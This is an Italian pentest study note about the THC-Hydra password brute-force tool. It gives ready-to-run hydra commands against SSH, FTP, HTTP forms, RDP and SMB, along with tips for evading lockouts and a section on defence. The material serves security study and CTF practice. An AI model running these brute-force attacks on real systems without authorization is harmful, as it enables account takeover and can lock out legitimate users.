---
tipo: entita
tag: [tool]
fase: 2
fonti: 3
aggiornato: 2026-06-20
stato: maturo
aliases: ["Hydra"]

---

# Hydra

## Cos'è

**Hydra** (o THC-Hydra) è un tool open source per il **brute-force e dictionary attack** su protocolli di autenticazione. Supporta oltre 50 protocolli: SSH, FTP, HTTP, HTTPS, SMB, RDP, MySQL, SMTP, Telnet e molti altri. Data una lista di username e una lista di password, testa automaticamente tutte le combinazioni fino a trovare le credenziali valide. È uno strumento fondamentale nella fase di [[Exploitation]] quando si individua un servizio con autenticazione debole.

> **Nota etica**: Hydra va usato ESCLUSIVAMENTE su sistemi autorizzati (lab, CTF, pentest con contratto). Il brute-force su sistemi altrui è illegale e può causare blocchi degli account e denial of service.

## Uso tipico

```bash
# Brute-force SSH con username singolo e wordlist password
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# Brute-force SSH con wordlist sia di username che di password
hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# Brute-force FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10

# Brute-force HTTP form POST (login web)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Brute-force HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.1.10/admin

# Brute-force RDP (Remote Desktop Protocol)
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.10

# Brute-force SMB
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.1.10

# Aumentare i thread (-t) per velocità — con cautela (può bloccare account)
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.1.10

# Salvare l'output su file
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 -o hydra_output.txt
```

**Flag chiave:**

| Flag | Significato |
|---|---|
| `-l` | Username singolo |
| `-L` | File con lista di username |
| `-p` | Password singola |
| `-P` | File con lista di password (wordlist) |
| `-t` | Thread paralleli (default: 16, abbassare su SSH) |
| `-s` | Porta personalizzata |
| `-f` | Fermarsi al primo match trovato |
| `-v` | Verbose — mostra ogni tentativo |
| `-o` | File di output |

**Sintassi per HTTP POST form:**
`/percorso:parametri_con_^USER^_e_^PASS^:stringa_di_fallimento`

## Quando si usa

- Fase di [[Exploitation]]: quando si scopre un servizio con autenticazione e si vuole testare password deboli o di default.
- Test di credenziali di default (admin/admin, root/toor, admin/password).
- Dopo una fase di [[OSINT]] in cui si raccolgono possibili username dal target.

## Note e trucchi

- **Limitare i thread** su SSH (usare `-t 4`): SSH ha rate limiting integrato e troppi tentativi paralleli causano blocchi o rallentano enormemente.
- Su CTF, partire sempre con la wordlist **rockyou.txt** (`/usr/share/wordlists/rockyou.txt` su [[Kali Linux]]) — contiene milioni di password reali da breach storici.
- Il **formato HTTP POST** è il più complesso: usare Burp Suite per intercettare la richiesta di login e copiare i parametri esatti.
- Alternativa: **Medusa** ha sintassi simile; **Patator** è più modulare. Per hash offline si usa invece **Hashcat** o **John the Ripper**.
- Molti servizi bloccano gli account dopo N tentativi falliti (account lockout). Verificare prima la policy e usare `-t 1` con `-w 3` (attesa tra tentativi).

## Mitigazione e difesa

- Abilitare MFA (Multi-Factor Authentication) su tutti i servizi critici.
- Configurare rate limiting e account lockout dopo pochi tentativi falliti.
- Usare password lunghe e complesse (o passphrase).
- Monitorare i log di autenticazione con [[SIEM]] per rilevare picchi di tentativi falliti.

## Collegamenti

- [[Exploitation]]
- [[OSINT]]
- [[Enumerazione]]
- [[SSH]] (vedi [[Porte e Protocolli Comuni]])
- [[Kali Linux]]
- [[Metodologia del Pentest]]

## Fonti

- THC-Hydra — GitHub ufficiale: <https://github.com/vanhauser-thc/thc-hydra>
- HackTricks — Brute Force: <https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force>
- TryHackMe — Hydra room: <https://tryhackme.com/room/hydra>
